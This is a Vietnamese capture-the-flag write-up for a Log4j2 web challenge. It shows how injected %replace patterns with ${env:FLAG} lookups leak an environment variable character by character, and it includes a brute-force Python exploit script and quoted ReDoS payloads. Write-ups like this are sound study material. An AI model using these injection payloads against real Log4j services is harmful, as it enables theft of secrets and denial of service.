# LOG4J2

Bài này cũng tương tự như bài trước nhưng đối với error thì đều hiển thị `Sensitive information detected in output. Censored for security reasons.`

![blind](https://user-images.githubusercontent.com/77546253/177235566-1a0bd15b-0bb0-4d5a-a858-669e1c35f11f.png)

Vì ta đang khai thác theo hướng log4j lookup và hiện tại có được:
- kết quả của lookup là hợp lệ thì không hiển thị ra `Sensitive information detected in output. Censored for security reasons.` (có thể là `The command should start with a /.` hoặc kết quả của `System.out.println()` ...)
- ngược lại hiển thị `Sensitive information detected in output. Censored for security reasons.`

=> tìm cách khai thác theo hướng blind

Tiếp theo mình thử search để tìm cách replace một chuỗi:

![search](https://user-images.githubusercontent.com/77546253/177235600-c4040336-b397-4fd5-ad6a-c4c2c1dedb4d.png)

Tìm được `%replace`, sau khi đọc [docs](https://logging.apache.org/log4j/2.x/manual/layouts.html#:~:text=in%20the%20string%20%22**%22.-,replace,-%7Bpattern%7D%7Bregex%7D%7Bsubstitution) của nó thì có thể hiểu như sau:

Syntax: _replace{pattern}{regex}{substitution}_

-> thực hiện việc thay thế `pattern` với `substitution` theo biểu thức `regex`.

Dùng source của version 1 sau đó build local, chỉnh `<Console name="Console" target="SYSTEM_ERR">` trong `log4j2.xml` thành `<Console name="Console" target="SYSTEM_OUT">` để debug.

Sau đó test với `%replace{${env:FLAG}}{CTF}{${java:os}}`:

![error_test](https://user-images.githubusercontent.com/77546253/177235624-4551272e-6f22-4275-a892-9f842ca8b595.png)

-> throw ra error ngay lập tức bởi vì biến môi trường FLAG có chứa `CTF` vì vậy sẽ trigger replace với substitution là `${java:os}`.  `named capturing group is missing trailing '}'` cho thấy **có lẽ** là không thể dùng lookup ở `substitution` của `%replace` hoặc cách dùng của mình bị sai (điều này không quan trọng lắm bởi vì mục đích vẫn là khai thác error-based).

Nếu test với `%replace{${env:FLAG}}{CTFbla}{${java:os}}` thì:

![success_test](https://user-images.githubusercontent.com/77546253/177235689-65bf74b3-fbfe-49e8-8a40-aa4dbb83925a.png)

-> không throw error bởi vì `CTFbla` không match với biến môi trường FLAG cho nên không trigger replace với substitution.

Tóm lại ta có:
- `text=%replace{${env:FLAG}}{CTF+<right character>}{${java:os}}` -> `The command should start with a /.`
- `text=%replace{${env:FLAG}}{CTF+<wrong character>}{${java:os}}` -> `Sensitive information detected in output. Censored for security reasons.`

---

## Script exploit:

_Note: dùng `.` để thay thế cho `{` trong flag nếu không sẽ bị lỗi syntax._


```py
import requests
import string
import re

URL = "https://log4j2-web.2022.ctfcompetition.com/"

FLAG = "CTF{"

while not FLAG.endswith('}'):
    for i in string.ascii_lowercase + '-':
        trying = r"%replace{${env:FLAG}}{KNOWN}{${java:os}}".replace("KNOWN", FLAG.replace('{', '.') + re.escape(i))
        print(trying)
        r = requests.post(URL, data = {"text": trying})
        if "Sensitive" in r.text:
            FLAG += i
            print(FLAG)
            break
```

**CTF{and-you-thought-it-was-over-didnt-you}**

___

P/S: bài này intended solution của nó là ReDoS khai thác dựa vào `regex` của `%replace` lúc đầu mình cũng định làm theo hướng này nhưng sau khi test ra được blind error-based như trên thì chuyển luôn 😗.

solution của tác giả `@phiber`:

```
{"text": "/%replace{%replace{${env:FLAG}}{^.{" + str(char_count) + "}(.).*}{$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1$1}@}{(.*" + c + "){10}$}{}"}
```

hoặc của `@maple3142`
```
%replace{S${env:FLAG}E}{^SCTF.something((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$}{}
```
